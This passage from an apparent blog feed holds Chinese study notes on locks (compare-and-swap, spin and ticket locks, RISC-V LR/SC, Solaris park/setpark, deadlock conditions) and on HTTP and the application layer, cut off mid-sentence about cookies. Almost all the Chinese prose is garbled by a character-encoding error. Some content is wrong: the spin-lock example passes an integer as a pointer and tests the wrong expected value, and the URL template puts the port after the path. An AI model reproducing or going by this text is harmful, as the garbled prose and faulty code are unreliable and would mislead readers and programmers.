å¦‚æœä¸ç›¸ç­‰ï¼Œåˆ™ç›®æ ‡æ“ä½œæ•°è¢«åŠ è½½åˆ°ALã€AXã€EAXæˆ–RAXå¯„å­˜å™¨ä¸­ï¼ŒxåŒæ—¶ZFæ ‡å¿—ä½ç½®0ã€‚</p><p>SETE r&#x2F;m8:Set byte if equal.è®¾ç½®r&#x2F;m8ä¸ºzfæ ‡å¿—ä½çš„å€¼</p></blockquote><p>cçš„ä¼ªä»£ç å°±æ˜¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CompareAndSwap</span><span class="params">(<span class="type">int</span> *ptr, <span class="type">int</span> expected, <span class="type">int</span> new)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret = *ptr;</span><br><span class="line">    <span class="keyword">if</span> (ret == expected) &#123;</span><br><span class="line">        *ptr = new;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è‡ªæ—‹é”spin lockå®ç°</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;<span class="comment">//flagä¸º0ä»£è¡¨æ²¡æœ‰é”ä¸Šï¼Œå¯ä»¥è¿›ä¸´ç•ŒåŒº</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">()</span>&#123;<span class="keyword">while</span>(CompareAndSwap(flag,<span class="number">1</span>,<span class="number">1</span>) == <span class="number">1</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">()</span>&#123;flag = <span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="riscv"><a href="#riscv" class="headerlink" title="riscv"></a>riscv</h3><p>LR&#x2F;SC æŒ‡ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lr.&#123;w/d&#125;.&#123;aqrl&#125; rd, (rs1)</span><br><span class="line">ä»å†…å­˜åœ°å€ rs1 ä¸­åŠ è½½å†…å®¹åˆ° rd å¯„å­˜å™¨ã€‚ç„¶ååœ¨ rs1 å¯¹åº”åœ°å€ä¸Šè®¾ç½®ä¿ç•™æ ‡è®°(reservation set),w/d åˆ†åˆ«å¯¹åº” 32 ä½/64 ä½ç‰ˆæœ¬,ä¸­æ–­ã€å…¶ä»–å¤„ç†å™¨å†™å…¥éƒ½ä¼šå¯¼è‡´æ ‡è®°æ¶ˆé™¤</span><br><span class="line">sc.&#123;w/d&#125;.&#123;aqrl&#125; rd, rs2, (rs1)</span><br><span class="line">scæŒ‡ä»¤åœ¨æŠŠrs2å€¼å†™åˆ°rs1åœ°å€ä¹‹å‰ï¼Œä¼šå…ˆåˆ¤æ–­ rs1 å†…å­˜åœ°å€æ˜¯å¦æœ‰è®¾ç½®ä¿ç•™æ ‡è®°ï¼Œå¦‚æœè®¾ç½®äº†ï¼Œåˆ™æŠŠ rs2 å€¼æ­£å¸¸å†™å…¥åˆ° rs1 å†…å­˜åœ°å€é‡Œï¼Œå¹¶æŠŠ rd å¯„å­˜å™¨è®¾ç½®æˆ 0ï¼Œè¡¨ç¤ºä¿å­˜æˆåŠŸã€‚å¦‚æœ rs1 å†…å­˜åœ°å€æ²¡æœ‰è®¾ç½®ä¿ç•™æ ‡è®°ï¼Œåˆ™ä¸ä¿å­˜ï¼Œå¹¶æŠŠ rd å¯„å­˜å™¨è®¾ç½®æˆ 1 è¡¨ç¤ºä¿å­˜å¤±è´¥ã€‚ä¸ç®¡æˆåŠŸè¿˜æ˜¯å¤±è´¥ï¼ŒscæŒ‡ä»¤éƒ½ä¼šæŠŠå½“å‰hartä¿ç•™çš„æ‰€æœ‰ä¿ç•™æ ‡è®°å…¨éƒ¨æ¸…é™¤</span><br></pre></td></tr></table></figure><p><strong>xchgå‡çº§ç‰ˆï¼šCompare-and-Swap çš„ LR&#x2F;SC å®ç°</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cas</span><span class="params">(<span class="type">int</span> *addr, <span class="type">int</span> cmp_val, <span class="type">int</span> new_val)</span> &#123;</span><br><span class="line">  <span class="type">int</span> old_val = *addr;</span><br><span class="line">  <span class="keyword">if</span> (old_val == cmp_val) &#123;</span><br><span class="line">    *addr = new_val; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cas:</span><br><span class="line">  lr.w  t0, (a0)       # Load original value.</span><br><span class="line">  bne   t0, a1, fail   # Doesnâ€™t match, so fail.</span><br><span class="line">  sc.w  t0, a2, (a0)   # Try to update.</span><br><span class="line">  bnez  t0, cas        # Retry if store-conditional failed.</span><br><span class="line">  li a0, 0             # Set return to success.</span><br><span class="line">  jr ra                # Return.</span><br><span class="line">fail:</span><br><span class="line">  li a0, 1             # Set return to failure.</span><br><span class="line">  jr ra                # Return</span><br></pre></td></tr></table></figure><p><strong>è‡ªæ—‹é”è¯„ä»·</strong></p><ul><li><p>æ­£ç¡®æ€§ ğŸ‘</p></li><li><p>å…¬å¹³æ€§ ğŸ‘</p></li><li><p>æ€§èƒ½</p><ul><li>å•æ ¸å¤„ç†å™¨ç«äº‰ï¼Œæ¯ä¸ªç«äº‰é”çš„çº¿ç¨‹éƒ½ä¼šæµªè´¹ä¸€ä¸ªæ—¶é—´ç‰‡</li><li>å¤šæ ¸å¤„ç†å™¨ç«äº‰ï¼Œä¸´ç•ŒåŒºä¸€èˆ¬å¾ˆçŸ­ï¼Œå¦ä¸€ä¸ªå¤„ç†å™¨ä¸Šçš„ç«äº‰é”çš„çº¿ç¨‹ä¼šå¾ˆå¿«å¾—åˆ°é”</li></ul></li></ul><h3 id="ticketé”"><a href="#ticketé”" class="headerlink" title="ticketé”"></a>ticketé”</h3><p>åˆ©ç”¨ç¡¬ä»¶åŸè¯­fetch-and-addï¼ŒåŸå­åœ°è¿”å›ç‰¹å®šåœ°å€çš„æ—§å€¼ï¼Œå¹¶ä¸”è®©è¯¥å€¼è‡ªå¢ä¸€</p><p><strong>x86</strong></p><p>xadd dest,srcæŒ‡ä»¤ï¼šExchange and Add</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">destï¼Œsrcå…ˆäº¤æ¢ï¼Œç„¶åå†æŠŠä¸¤è€…ä¹‹å’Œä»˜ç»™dest</span><br><span class="line">TEMP := SRC + DEST;</span><br><span class="line">SRC := DEST;</span><br><span class="line">DEST := TEMP;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">fetch_and_add</span><span class="params">(<span class="type">int</span>* variable, <span class="type">int</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;lock; xaddl %0, %1&quot;</span></span></span><br><span class="line"><span class="params">                     : <span class="string">&quot;+r&quot;</span> (value), <span class="string">&quot;+m&quot;</span> (*variable) <span class="comment">// input+output</span></span></span><br><span class="line"><span class="params">                     : <span class="comment">// No input-only</span></span></span><br><span class="line"><span class="params">                     : <span class="string">&quot;memory&quot;</span></span></span><br><span class="line"><span class="params">                    )</span>;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ticketé”</strong>å®ç°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FetchAndAdd</span><span class="params">(<span class="type">int</span> *ptr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> old = *ptr;</span><br><span class="line">    *ptr = old + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> old;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">lock_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> ticket;</span><br><span class="line">    <span class="type">int</span> turn;</span><br><span class="line">&#125; <span class="type">lock_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_init</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123;</span><br><span class="line">    lock-&gt;ticket = <span class="number">0</span>;</span><br><span class="line">    lock-&gt;turn = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123;</span><br><span class="line">    <span class="type">int</span> myturn = FetchAndAdd(&amp;lock-&gt;ticket);</span><br><span class="line">    <span class="keyword">while</span> (lock-&gt;turn != myturn)</span><br><span class="line">        ; <span class="comment">// spin</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123;</span><br><span class="line">    FetchAndAdd(&amp;lock-&gt;turn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ticketèƒ½å¤Ÿä¿è¯æ¯ä¸€ä¸ªç«äº‰çº¿ç¨‹éƒ½èƒ½å¤ŸæŠ¢åˆ°é”ï¼Œä¸”æŒ‰ç…§è‡ªæ—‹ç­‰å¾…çš„å…ˆåé¡ºåº</p><h2 id="æ“ä½œç³»ç»Ÿæ”¯æŒ"><a href="#æ“ä½œç³»ç»Ÿæ”¯æŒ" class="headerlink" title="æ“ä½œç³»ç»Ÿæ”¯æŒ"></a>æ“ä½œç³»ç»Ÿæ”¯æŒ</h2><p>å¯¹äºç®€å•çš„yield+è‡ªæ—‹ï¼Œyield()ç³»ç»Ÿè°ƒç”¨è®©çº¿ç¨‹è®©å‡ºcpuï¼Œå¯èƒ½æ“ä½œç³»ç»Ÿä¸‹æ¬¡è¿˜æ˜¯é€‰æ‹©è¿è¡Œè¯¥çº¿ç¨‹ï¼ŒåŒæ—¶å…¶ä»–çº¿ç¨‹åªèƒ½çœ‹ç€æœ‰é”çš„çº¿ç¨‹åšäº‹ï¼Œè™½ç„¶æ¯”æµªè´¹å®Œæ•´æ—¶é—´ç‰‡è¦å¥½ï¼Œä½†æ˜¯ç³»ç»Ÿè°ƒç”¨çš„ä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€ä¹Ÿå¾ˆå¤§</p><h3 id="park-è‡ªæ—‹é”"><a href="#park-è‡ªæ—‹é”" class="headerlink" title="park+è‡ªæ—‹é”"></a>park+è‡ªæ—‹é”</h3><p><strong>Solaris</strong></p><p>Solarisç³»ç»Ÿæä¾›äº†ç³»ç»Ÿè°ƒç”¨ï¼Œpark()èƒ½å¤Ÿè®©è°ƒç”¨çº¿ç¨‹ä¼‘çœ ï¼Œunpark(threadID)åˆ™ä¼šå”¤é†’ threadID æ ‡è¯†çš„çº¿ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">lock_t</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> flag;</span><br><span class="line">  <span class="type">int</span> guard;</span><br><span class="line">  <span class="type">queue_t</span> *q;<span class="comment">//é˜Ÿåˆ—é˜²æ­¢äº†é¥¿æ­»æŸä¸ªçº¿ç¨‹çš„é—®é¢˜</span></span><br><span class="line">&#125; <span class="type">lock_t</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_init</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  m-&gt;flag = <span class="number">0</span>;</span><br><span class="line">  m-&gt;guard = <span class="number">0</span>;</span><br><span class="line">  queue_init(m-&gt;q);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (TestAndSet(&amp;m-&gt;guard, <span class="number">1</span>) == <span class="number">1</span>)<span class="comment">//è·å–é”æˆ–è€…é‡Šæ”¾é”å…¶ä»–çº¿ç¨‹è¿˜æ˜¯éœ€è¦è‡ªæ—‹ï¼Œæ¥ä¿è¯å†…å­˜ä¸€è‡´</span></span><br><span class="line">    ; <span class="comment">// acquire guard lock by spinning</span></span><br><span class="line">  <span class="keyword">if</span> (m-&gt;flag == <span class="number">0</span>) &#123;</span><br><span class="line">    m-&gt;flag = <span class="number">1</span>; <span class="comment">// lock is acquired çœŸæ­£è·å–é”</span></span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//è®¾ç½®åæœ‰çº¿ç¨‹æŠ¢é”ä¼šç»“æŸè‡ªæ—‹ï¼ŒåŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    queue_add(m-&gt;q, gettid());</span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//è®¾ç½®åæœ‰çº¿ç¨‹æŠ¢é”ä¼šç»“æŸè‡ªæ—‹ï¼ŒåŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line">    park();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (TestAndSet(&amp;m-&gt;guard, <span class="number">1</span>) == <span class="number">1</span>)<span class="comment">//è·å–é”æˆ–è€…é‡Šæ”¾é”å…¶ä»–çº¿ç¨‹è¿˜æ˜¯éœ€è¦è‡ªæ—‹ï¼Œæ¥ä¿è¯å†…å­˜ä¸€è‡´</span></span><br><span class="line">    ; <span class="comment">// acquire guard lock by spinning</span></span><br><span class="line">  <span class="keyword">if</span> (queue_empty(m-&gt;q))</span><br><span class="line">    m-&gt;flag = <span class="number">0</span>; <span class="comment">// let go of lock; no one wants it</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    unpark(queue_remove(m-&gt;q)); <span class="comment">// hold lock (for next thread!)ç›´æ¥æŠŠflagçš„é”ç»™ä¸‹ä¸€ä¸ªçº¿ç¨‹å³å¯ï¼Œ</span></span><br><span class="line">  m-&gt;guard = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é—®é¢˜:å‡è®¾ä¸€ä¸ªçº¿ç¨‹å·²ç»åŠ å…¥ä¼‘çœ é˜Ÿåˆ—å°†è¦è°ƒç”¨parkä¼‘çœ ,æ­¤æ—¶å¦‚æœç³»ç»Ÿåˆ‡æ¢åˆ°äº†æ­£åœ¨æŒæœ‰é”çš„çº¿ç¨‹ã€‚å¦‚æœè¯¥çº¿ç¨‹éšåé‡Šæ”¾äº†é”ï¼Œå‰é¢çš„çº¿ç¨‹è°ƒç”¨parkåå¯èƒ½ä¼šæ°¸è¿œä¼‘çœ ä¸‹å»ã€‚</p><p>Solariså¢åŠ äº†ç¬¬ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨ separk()æ¥è§£å†³é—®é¢˜</p><p>setpark():ä¸€ä¸ªçº¿ç¨‹è¡¨æ˜è‡ªå·±é©¬ä¸Šè¦ parkã€‚å¦‚æœåˆšå¥½å¦ä¸€ä¸ªçº¿ç¨‹è¢«è°ƒåº¦ï¼Œå¹¶ä¸”è°ƒç”¨äº† unparkï¼Œé‚£ä¹ˆåç»­çš„parkè°ƒç”¨å°±ä¼šç›´æ¥è¿”å›,ä¸ä¼šä¼‘çœ </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (TestAndSet(&amp;m-&gt;guard, <span class="number">1</span>) == <span class="number">1</span>)<span class="comment">//è·å–é”æˆ–è€…é‡Šæ”¾é”å…¶ä»–çº¿ç¨‹è¿˜æ˜¯éœ€è¦è‡ªæ—‹ï¼Œæ¥ä¿è¯å†…å­˜ä¸€è‡´</span></span><br><span class="line">    ; <span class="comment">// acquire guard lock by spinning</span></span><br><span class="line">  <span class="keyword">if</span> (m-&gt;flag == <span class="number">0</span>) &#123;</span><br><span class="line">    m-&gt;flag = <span class="number">1</span>; <span class="comment">// lock is acquired çœŸæ­£è·å–é”</span></span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//è®¾ç½®åæœ‰çº¿ç¨‹æŠ¢é”ä¼šç»“æŸè‡ªæ—‹ï¼ŒåŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    queue_add(m-&gt;q, gettid());</span><br><span class="line">    setpark();<span class="comment">// new code</span></span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//è®¾ç½®åæœ‰çº¿ç¨‹æŠ¢é”ä¼šç»“æŸè‡ªæ—‹ï¼ŒåŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line">    park();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ­»é”"><a href="#æ­»é”" class="headerlink" title="æ­»é”"></a>æ­»é”</h2><p>æ­»é”ä¸€èˆ¬æœ‰ä»¥ä¸‹å››ä¸ªå¿…è¦æ¡ä»¶</p><ul><li>äº’æ–¥ï¼Œçº¿ç¨‹å¯¹äºéœ€è¦çš„èµ„æºè¿›è¡Œäº’æ–¥çš„è®¿é—®</li><li>æŒæœ‰å’Œç­‰å¾…ï¼Œçº¿ç¨‹æŒæœ‰å·²æœ‰çš„èµ„æºï¼ŒåŒæ—¶ç­‰å¾…ä½¿ç”¨ä¸‹ä¸€ä¸ªèµ„æºã€‚</li><li>ä¸å¯æŠ¢å ï¼Œè¿›ç¨‹æ‰€è·å¾—çš„èµ„æºåœ¨æœªä½¿ç”¨å®Œæ¯•ä¹‹å‰ï¼Œèµ„æºç”³è¯·è€…ä¸èƒ½å¼ºè¡Œåœ°ä»èµ„æºå æœ‰è€…æ‰‹ä¸­å¤ºå–èµ„æºï¼Œè€Œåªèƒ½ç”±è¯¥èµ„æºçš„å æœ‰è€…è¿›ç¨‹è‡ªè¡Œé‡Šæ”¾ã€‚</li><li>å¾ªç¯ç­‰å¾…ï¼Œçº¿ç¨‹ä¹‹é—´å­˜åœ¨ä¸€ä¸ªç¯è·¯ï¼Œç¯è·¯ä¸Šæ¯ä¸ªçº¿ç¨‹éƒ½é¢å¤–æŒæœ‰ä¸€ä¸ªèµ„æºï¼Œè€Œè¿™ä¸ªèµ„æºåˆæ˜¯ä¸‹ä¸€ä¸ªçº¿ç¨‹è¦ç”³è¯·çš„ã€‚</li></ul><p>å¦‚æœè¿™ 4 ä¸ªæ¡ä»¶çš„ä»»ä½•ä¸€ä¸ªæ²¡æœ‰æ»¡è¶³ï¼Œæ­»é”å°±ä¸ä¼šäº§ç”Ÿã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Heap</title>
      <link href="/2023/09/01/kernel-heap/"/>
      <url>/2023/09/01/kernel-heap/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œ:åˆ†å±‚æ¨¡å‹&amp;&amp;åº”ç”¨å±‚</title>
      <link href="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/"/>
      <url>/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/OSI.jpg" alt="OSI"></p><h1 id="åˆ†å±‚æ¨¡å‹"><a href="#åˆ†å±‚æ¨¡å‹" class="headerlink" title="åˆ†å±‚æ¨¡å‹"></a>åˆ†å±‚æ¨¡å‹</h1><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230827150702534.png" alt="image-20230827150702534"></p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230907123035154.png" alt="image-20230907123035154"></p><p>æ¯ä¸€å±‚åˆ©ç”¨ä¸‹å±‚æä¾›çš„æœåŠ¡ä¸ºåŸºç¡€æ¥ä¸ºä¸Šå±‚æä¾›æœåŠ¡ï¼Œæœ€ç»ˆæœåŠ¡äºåº”ç”¨å±‚çš„åº”ç”¨ç¨‹åº</p><h1 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h1><h2 id="ç½‘ç»œåº”ç”¨çš„ä½“ç³»ç»“æ„"><a href="#ç½‘ç»œåº”ç”¨çš„ä½“ç³»ç»“æ„" class="headerlink" title="ç½‘ç»œåº”ç”¨çš„ä½“ç³»ç»“æ„"></a>ç½‘ç»œåº”ç”¨çš„ä½“ç³»ç»“æ„</h2><ul><li>å®¢æˆ·-æœåŠ¡å™¨æ¨¡å¼ (C&#x2F;S:client&#x2F;server)<ul><li>æœåŠ¡å™¨å…ˆä¸”ä¸€ç›´è¿è¡Œï¼Œå®ˆæŠ¤åœ¨æŸäº›ç«¯å£ä¸Š</li><li>å¯æ‹“å±•æ€§ï¼Œå¯é æ€§æ¯”è¾ƒå·®</li><li>å®¢æˆ·æ•°é‡è¾¾åˆ°ä¸€å®šé˜ˆå€¼åä¼šæ–­å´–å¼ä¸‹é™</li></ul></li><li>å¯¹ç­‰æ¨¡å¼ (P2P:Peer To Peer)<ul><li>ä»»æ„ç«¯ç³»ç»Ÿä¹‹é—´å¯ä»¥é€šä¿¡ï¼Œæ¯ä¸ªèŠ‚ç‚¹å³ä½¿å®¢æˆ·ç«¯åˆæ˜¯æœåŠ¡å™¨</li><li>è‡ªæ‹“å±•æ€§</li><li>è¿…é›·ï¼Œå¿«æ’­ğŸ˜³</li></ul></li><li>æ··åˆä½“ å®¢æˆ·-æœåŠ¡å™¨å’Œå¯¹ç­‰ä½“ç³»ç»“æ„</li></ul><h2 id="è·¨ç«¯ç³»ç»Ÿè¿›ç¨‹é€šä¿¡"><a href="#è·¨ç«¯ç³»ç»Ÿè¿›ç¨‹é€šä¿¡" class="headerlink" title="è·¨ç«¯ç³»ç»Ÿè¿›ç¨‹é€šä¿¡"></a>è·¨ç«¯ç³»ç»Ÿè¿›ç¨‹é€šä¿¡</h2><p>é€šè¿‡å¥—æ¥å­—(socket)æ¥ä»ç½‘ç»œå‘é€å’Œæ¥å—æŠ¥æ–‡ï¼Œåº”ç”¨ç¨‹åºå¼€å‘è€…æ§åˆ¶å¥—æ¥å­—åœ¨åº”ç”¨å±‚çš„ä¸€åˆ‡ï¼Œå¯¹å¥—æ¥å­—åœ¨ä¼ è¾“å±‚çš„æ§åˆ¶å‡ ä¹ä¸º0</p><blockquote><p>socketå…·ä½“çœ‹è¿™ç¯‡æ–‡ç« : <a href="https://segmentfault.com/a/1190000041413541">https://segmentfault.com/a/1190000041413541</a></p><p>ç®€å•æ¥è¯´tcp socketå°±æ˜¯æ“ä½œç³»ç»Ÿç»´æŠ¤çš„ä¸€ä¸ªäº”å…ƒç»„**[æºIP, æºç«¯å£, ç›®çš„IP, ç›®çš„ç«¯å£, ç±»å‹(TCP or UDP)]<strong>ï¼Œudp socketå°±æ˜¯ä¸€ä¸ªä¸‰å…ƒç»„</strong>[ç›®çš„IP, ç›®çš„ç«¯å£, ç±»å‹(TCP or UDP)]**ï¼Œè¿”å›çš„socketå°±æ˜¯è¿™ä¸ªæ•°ç»„çš„ä¸‹æ ‡</p></blockquote><p>è·¨ç«¯ç³»ç»Ÿè¿›ç¨‹é€šä¿¡éœ€è¦çš„ä¿¡æ¯</p><ul><li>ç›®æ ‡ä¸»æœºåœ°å€:IPåœ°å€</li><li>æ‰€é‡‡ç”¨ä¼ è¾“å±‚åè®®:TCP or UDP</li><li>ç›®æ ‡ä¸»æœºä¸­ç›®æ ‡è¿›ç¨‹çš„æ ‡è¯†ç¬¦:ç«¯å£å·</li></ul><p>å¥—æ¥å­—æ˜¯åº”ç”¨ç¨‹åºè¿›ç¨‹å’Œä¼ è¾“å±‚åè®®ç›´æ¥çš„æ¥å£ï¼Œä½¿ç”¨å“ªç§ä¼ è¾“å±‚åè®®ï¼Œéœ€è¦ç»“åˆåº”ç”¨è¿›ç¨‹çš„è¦æ±‚</p><ul><li>å¯é æ•°æ®ä¼ è¾“</li><li>ååé‡</li><li>å®šæ—¶</li><li>å®‰å…¨æ€§</li></ul><p>å› ç‰¹ç½‘æä¾›äº†UDPå’ŒTCPä¸¤ç§ä¼ è¾“å±‚åè®®</p><ul><li>TCPï¼šTransmission Control Protocol<ul><li>é¢å‘è¿æ¥</li><li>å¯é æ•°æ®ä¼ è¾“æœåŠ¡</li><li>æ‹¥å¡æ§åˆ¶æœºåˆ¶</li></ul></li><li>UDPï¼šUser Datagram Protocol<ul><li>æ— è¿æ¥</li><li>ä¸å¯é </li><li>æ— æ‹¥å¡æ§åˆ¶</li></ul></li></ul><blockquote><p>TCPå®‰å…¨æ˜¯é å®‰å…¨å¥—æ¥å­—å±‚(secure sockets layer,SSL)æ¥å®ç°çš„ï¼ŒSSLåœ¨<strong>åº”ç”¨å±‚</strong>å®ç°</p></blockquote><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>http è¶…æ–‡æœ¬ä¼ è¾“åè®®(hypertext transfer protocol) ä½¿ç”¨tcpä½œä¸ºä¼ è¾“å±‚åè®®ï¼Œæ˜¯ä¸€ä¸ªæ— çŠ¶æ€åè®®(ä¸ä¿å­˜å…³äºå®¢æˆ·çš„ä»»ä½•ä¿¡æ¯) é»˜è®¤80ç«¯å£</p><p>http&#x2F;1.0é‡‡ç”¨éæŒç»­è¿æ¥ï¼Œhttp&#x2F;1.1é»˜è®¤é‡‡ç”¨æŒç»­è¿æ¥</p><blockquote><p>éæŒç»­,æŒç»­è¿æ¥åŒºåˆ«åœ¨äºä¸€ä¸ªå¯¹è±¡ä¼ è¾“ç»“æŸåï¼Œæ˜¯å¦ç«‹å³å…³é—­tcpè¿æ¥</p><p>æµæ°´çº¿ï¼Œä¸€ä¸ªè¯·æ±‚å¯¹è±¡è¿˜æ²¡åˆ°è¾¾æ—¶ï¼Œå†å»è¯·æ±‚å¦ä¸€ä¸ªå¯¹è±¡</p><p>éæµæ°´çº¿ ä¸€ä¸ªä¸€ä¸ªå®Œæ•´è¯·æ±‚ï¼Œè¯·æ±‚-åˆ°è¾¾-è¯·æ±‚-åˆ°è¾¾â€¦â€¦â€¦â€¦</p></blockquote><p>URLåŸºæœ¬æ ¼å¼: </p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">protocol://user:password@www.someSchool.edu/someDept/pic.gif:port</span><br><span class="line">åè®®         ç”¨æˆ·å å£ä»¤      ä¸»æœºå             è·¯å¾„å ç«¯å£</span><br></pre></td></tr></table></figure><p><strong>HTTPè¯·æ±‚æŠ¥æ–‡çš„é€šç”¨æ ¼å¼</strong></p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230827121842745.png" alt="image-20230827121842745"></p><blockquote><p>postæ–¹æ³•æ—¶æ‰ä¼šä½¿ç”¨è¯·æ±‚å®ä½“ä½“</p></blockquote><p><strong>HTTPå“åº”æŠ¥æ–‡çš„é€šç”¨æ ¼å¼</strong></p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230827122100051.png" alt="image-20230827122100051"></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>httpæ˜¯æ— çŠ¶æ€çš„ï¼Œä¸ºäº†è¯†åˆ«ç”¨æˆ·ï¼Œå®ç°æŸå†™åŠŸèƒ½ï¼Œé‡‡ç”¨äº†cookieä¸ç”¨æˆ·èº«ä»½è”ç³»èµ·æ¥</p><p>cookieç»„ä»¶</p><ul><li>è¯·æ±‚å’Œå“åº”æŠ¥æ–‡çš„cookieé¦–éƒ¨è¡Œ</li><li>ç”¨æˆ·ç«¯ç³»ç»Ÿçš„cookieæ–‡ä»¶ï¼Œç”±æµè§ˆå™¨ç®¡ç†</li><li>webåç«¯æ•°æ®åº“</li></ul><p>ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®æŸä¸ªwebç«™ç‚¹æ—¶ï¼Œwebç«™ç‚¹ä¼šç”Ÿæˆä¸€ä¸ªå”¯ä¸€è¯†åˆ«ç ï¼Œå¹¶æŠŠä»–å½“æˆç´¢å¼•åœ¨åç«¯æ•°æ®åº“äº§ç”Ÿä¸€ä¸ªè¡¨é¡¹ï¼Œå‘é€çš„å“åº”æŠ¥æ–‡ä¼šæœ‰<code>Set-cookieçš„é¦–éƒ¨è¡Œ</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-cookie</span><span class="punctuation">: 